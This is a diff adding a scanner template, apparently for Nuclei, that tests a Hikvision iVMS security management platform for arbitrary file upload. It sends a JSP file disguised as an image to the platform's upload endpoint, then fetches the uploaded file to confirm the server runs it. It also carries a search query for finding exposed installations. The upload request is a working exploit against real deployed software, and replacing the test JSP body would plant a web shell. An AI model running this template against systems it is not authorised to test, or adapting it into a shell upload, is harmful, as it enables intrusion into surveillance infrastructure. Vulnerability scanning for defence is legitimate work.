@@ -1,0 +1,51 @@
+id: hikvision_iVMS_eps_upload
+info:
+  name: HiKVISION iVMS综合安防管理平台eps文件上传
+  author: Xc1Ym
+  severity: critical
+  description: 海康威视iVMS综合安防管理平台eps接口存在任意文件上传
+  metadata:
+    max-request: 1
+    fofa-query: app="HIKVISION-iVMS"
+    verified: true
+  tags: upload,iot,hikvision,hw,intrusive
+http:
+  - raw:
+      - |
+        POST /eps/resourceOperations/upload.action HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: MicroMessenger
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8700_Sessionname=4D808BE7BE0E5C7047B9688E6009F710
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
+        Content-Length: 218
+
+        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj
+        Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
+        Content-Type: image/jpeg
+
+        <%out.println("Hello World");%>
+        ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
+      - |
+        GET /eps/upload/{{name1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        part: body
+        internal: true
+        name: name1
+        json:
+        - '.data|.resourceUuid'
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2==200"
+          - "contains(body_2, 'Hello World')"
+        condition: and
+# digest: 4b0a00483046022100e26793cee7c322e89de6b13b8482ae11238fd2d4aa6239cdc6bcd08e291b71f2022100ea115281eb9e9edba0452594dc3acdc81bc4d5dd739db4b7ccbf2548ceff29e8:6b2dd5af372f02ed15a56faf8ad98cf9
